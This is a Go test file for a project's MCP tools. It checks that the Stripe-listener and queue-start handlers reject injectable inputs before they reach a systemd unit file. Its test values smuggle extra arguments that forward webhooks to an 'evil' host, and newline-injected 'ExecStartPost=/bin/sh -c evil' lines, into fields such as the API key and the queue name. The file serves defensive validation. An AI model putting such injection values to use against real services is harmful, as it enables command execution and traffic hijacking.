package mcp

import (
	"testing"

	"github.com/geodro/lerd/internal/config"
)

// The MCP start path must reject an injectable webhook_path the same way the
// CLI does; otherwise whitespace/newlines flow straight into the listener
// unit's ExecStart line. The happy path writes a systemd unit, so only the
// rejection (which returns before any side effect) is exercised here.
func TestExecStripeListen_rejectsInjectableWebhookPath(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	if err := config.AddSite(config.Site{Name: "acme", Path: t.TempDir(), Domains: []string{"acme.test"}}); err != nil {
		t.Fatal(err)
	}
	res, _ := execStripeListen(map[string]any{
		"site":         "acme",
		"api_key":      "sk_test_x",
		"webhook_path": "/x --skip-verify --forward-to https://evil",
	})
	if !mcpIsError(res) {
		t.Fatalf("expected an error for a webhook_path with whitespace, got: %s", mcpText(t, res))
	}
}

func TestExecStripeListen_rejectsInjectableApiKey(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	if err := config.AddSite(config.Site{Name: "acme", Path: t.TempDir(), Domains: []string{"acme.test"}}); err != nil {
		t.Fatal(err)
	}
	res, _ := execStripeListen(map[string]any{
		"site":    "acme",
		"api_key": "sk_x\nExecStartPost=/bin/sh -c evil",
	})
	if !mcpIsError(res) {
		t.Fatalf("expected an error for an api_key with a newline, got: %s", mcpText(t, res))
	}
}

func TestExecQueueStart_rejectsInjectableQueue(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	if err := config.AddSite(config.Site{Name: "acme", Path: t.TempDir(), Domains: []string{"acme.test"}}); err != nil {
		t.Fatal(err)
	}
	res, _ := execQueueStart(map[string]any{
		"site":  "acme",
		"queue": "default\nExecStartPost=/bin/sh -c evil",
	})
	if !mcpIsError(res) {
		t.Fatalf("expected an error for a queue name with a newline, got: %s", mcpText(t, res))
	}
}
